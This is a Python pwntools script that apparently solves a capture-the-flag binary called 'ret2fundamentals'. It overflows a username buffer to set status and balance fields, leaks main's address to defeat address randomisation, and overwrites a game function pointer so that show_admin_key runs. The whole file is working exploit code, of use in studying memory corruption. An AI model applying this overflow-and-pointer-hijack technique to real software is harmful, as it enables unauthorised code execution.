#!/usr/bin/env python3

from pwn import *

binary = "./ret2fundamentals"
elf = ELF(binary)

p = process(binary)
context.arch = "amd64"

p.sendlineafter(b"Enter your username: ", b"test")
p.sendlineafter(b">: ", b"1") # change username

payload  = b"A" * 52
payload += p32(0xcafebabe)  # 4 octets: status
payload += p32(0x41414141)  # 4 octets: balance, par ex. 0x41414141 instead of 1 000 000  

p.sendlineafter(b"Enter your new username: ", payload)

p.sendlineafter(b">: ", b"4") # vip mode  
p.sendlineafter(b">: ", b"5") # dev mode  
p.sendlineafter(b">: ", b"2") # show main address

p.recvuntil(b"[debug] main(): ")
leaked_addr_str = p.recvline().strip()
leaked_addr = int(leaked_addr_str, 16)
log.info(f"Leaked main address: {hex(leaked_addr)}")

main_fun_offset = elf.symbols["main"]
elf.address = leaked_addr - main_fun_offset
log.info(f"Base address of the binary: {hex(elf.address)}")
flag_function = elf.symbols["show_admin_key"]
log.info(f"Address of show_admin_key: {hex(flag_function)}")

p.sendlineafter(b">: ", b"3") # delete player
p.sendlineafter(b">: ", b"1") # assign name to dev

payload = b"a" * 88
payload  = b"A" * 52
payload += p32(0xcafebabe)  # 4 octets: status
payload += p32(0x41414141)  # 4 octets: balance, par ex. 0x41414141 instead of 1 000 000 
payload += b"B" * 4
payload += p64(flag_function) # 8 octets: address of play black jack func

p.sendlineafter(b"Welcome dev, enter your new username: ", payload)

p.sendlineafter(b">: ", b"4") # quit dev menu
p.sendlineafter(b">: ", b"6") # exit vip room
p.sendlineafter(b">: ", b"2") # play black jack (func address replaced by flag function)

print(p.recvline().decode())

p.close()
